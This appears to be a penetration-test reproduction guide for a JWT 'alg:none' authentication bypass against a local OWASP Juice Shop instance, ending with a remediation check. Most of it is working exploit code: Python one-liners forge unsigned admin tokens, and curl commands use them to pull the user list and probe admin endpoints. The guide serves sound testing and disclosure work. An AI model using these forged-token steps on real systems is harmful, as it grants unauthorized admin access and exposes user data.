# F-003: Manual Reproduction Steps — JWT alg:none Bypass

## Prerequisites

- Target: http://localhost:3000 (OWASP Juice Shop running in Docker)
- Tools: curl, python3 (stdlib only)

## Step 1: Verify the target requires authentication

```bash
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/api/Users/
# Expected: 401 (endpoint is protected)
```

## Step 2: Forge a JWT token with alg:none

```bash
python3 -c "
import base64, json

header  = json.dumps({'typ':'JWT','alg':'none'}, separators=(',',':')).encode()
payload = json.dumps({
    'status': 'success',
    'data': {'id': 1, 'username': 'hacker', 'email': 'hacker@pwned.com', 'role': 'admin'},
    'iat': 9999999999
}, separators=(',',':')).encode()

h = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
```

This prints the forged token. Copy it.

## Step 3: Use the forged token against the Users API

```bash
FORGED="eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJoYWNrZXIiLCJlbWFpbCI6ImhhY2tlckBwd25lZC5jb20iLCJyb2xlIjoiYWRtaW4ifSwiaWF0Ijo5OTk5OTk5OTk5fQ."

curl -s http://localhost:3000/api/Users/ \
  -H "Authorization: Bearer $FORGED" | python3 -m json.tool
```

**Expected result:** HTTP 200 with full list of 21 users — VULNERABILITY CONFIRMED.

## Step 4: Test additional admin endpoints

```bash
for EP in /api/Feedbacks/ /api/Complaints/ /rest/admin/application-version; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://localhost:3000$EP" -H "Authorization: Bearer $FORGED")
  echo "$EP -> HTTP $STATUS"
done
```

## Step 5: Confirm with a different role claim (e.g., customer)

```bash
python3 -c "
import base64, json
header  = json.dumps({'typ':'JWT','alg':'none'}, separators=(',',':')).encode()
payload = json.dumps({'status':'success','data':{'id':99,'username':'evil','email':'evil@attacker.com','role':'admin'},'iat':9999999999}, separators=(',',':')).encode()
h = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()
print(f'{h}.{p}.')
" | xargs -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  http://localhost:3000/api/Users/ -H "Authorization: Bearer {}"
```

## Expected Outcome

All three confirmation runs return HTTP 200. The server accepts the unsigned
token because it does not enforce a signature algorithm whitelist.

## Remediation Verification

After patching, all requests with `alg:none` tokens should return HTTP 401.
